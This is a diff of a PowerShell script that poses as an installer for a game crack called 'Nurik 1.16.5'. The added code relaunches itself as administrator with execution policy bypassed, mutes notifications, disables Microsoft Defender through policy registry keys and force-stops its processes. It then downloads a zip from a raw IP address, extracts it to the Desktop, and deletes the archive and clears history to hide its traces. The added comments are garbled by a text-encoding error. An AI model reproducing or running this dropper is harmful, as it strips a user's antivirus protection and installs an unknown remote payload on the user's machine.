@@ -1,20 +1,50 @@
-# Включение режима "Не беспокоить" через реестр
-Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings" -Name "NOC_GLOBAL_SETTING_TOASTS_ENABLED" -Value 0
+# РџСЂРѕРІРµСЂРєР° РїСЂР°РІ Р°РґРјРёРЅРёСЃС‚СЂР°С‚РѕСЂР°
+$currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
+$adminRole = [Security.Principal.WindowsBuiltInRole]::Administrator
+if (-Not ([Security.Principal.WindowsPrincipal]$currentUser).IsInRole($adminRole)) {
+    Write-Host "РџРµСЂРµР·Р°РїСѓСЃРє СЃ РїСЂР°РІР°РјРё Р°РґРјРёРЅРёСЃС‚СЂР°С‚РѕСЂР°..."
+    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`""
+    Start-Process powershell.exe -ArgumentList $arguments -Verb RunAs
+    exit
+}
 
-# Отключение Defender
-Set-MpPreference -DisableRealtimeMonitoring $true
-Stop-Service -Name WinDefend -Force
+# Р’РєР»СЋС‡РµРЅРёРµ СЂРµР¶РёРјР° "РќРµ Р±РµСЃРїРѕРєРѕРёС‚СЊ"
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings" -Name "NOC_GLOBAL_SETTING_TOASTS_ENABLED" -Value 0 -ErrorAction SilentlyContinue
 
-# Скачивание архива с GitHub во временную папку
-$url = "http://176.108.245.12:25565/uploads/Nurik_1.16.5_crack_1.zip"  # Замените на реальный URL
+# РћС‚РєР»СЋС‡РµРЅРёРµ Defender С‡РµСЂРµР· СЂРµРµСЃС‚СЂ (Р°Р»СЊС‚РµСЂРЅР°С‚РёРІР° РєРѕРјР°РЅРґР»РµС‚Р°Рј)
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f
+
+# РџСЂРёРЅСѓРґРёС‚РµР»СЊРЅРѕРµ Р·Р°РІРµСЂС€РµРЅРёРµ РїСЂРѕС†РµСЃСЃРѕРІ Defender
+Get-Process -Name "MsMpEng", "NisSrv", "SecurityHealthService" -ErrorAction SilentlyContinue | Stop-Process -Force
+
+# РЎРєР°С‡РёРІР°РЅРёРµ СЃ РїСЂРѕРіСЂРµСЃСЃ-Р±Р°СЂРѕРј
+$url = "http://176.108.245.12:25565/uploads/Nurik_1.16.5_crack_1.zip"
 $tempPath = "$env:TEMP\Nurik_1.16.5_crack_1.zip"
-Invoke-RestMethod -Uri $url -OutFile $tempPath
 
-# Распаковка архива на рабочий стол с помощью .NET
+function Download-File {
+    param(
+        [string]$Url,
+        [string]$TargetPath
+    )
+    $webClient = New-Object System.Net.WebClient
+    $webClient.DownloadProgressChanged += {
+        $percent = $_.ProgressPercentage
+        Write-Progress -Activity "Р—Р°РіСЂСѓР·РєР° С„Р°Р№Р»Р°" -Status "Р—Р°РіСЂСѓР¶РµРЅРѕ $percent%" -PercentComplete $percent
+    }
+    $webClient.DownloadFileAsync($Url, $TargetPath)
+    while ($webClient.IsBusy) { Start-Sleep -Milliseconds 100 }
+    Write-Progress -Activity "Р—Р°РіСЂСѓР·РєР° С„Р°Р№Р»Р°" -Completed
+}
+
+Download-File -Url $url -TargetPath $tempPath
+
+# Р Р°СЃРїР°РєРѕРІРєР° Р°СЂС…РёРІР°
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 $destinationPath = "$env:USERPROFILE\Desktop\Nurik1.16.5"
+if (!(Test-Path $destinationPath)) { New-Item -ItemType Directory -Path $destinationPath -Force }
 [System.IO.Compression.ZipFile]::ExtractToDirectory($tempPath, $destinationPath)
 
-# Очистка следов
+# РћС‡РёСЃС‚РєР° СЃР»РµРґРѕРІ
 Remove-Item -Path $tempPath -Force
 Clear-History
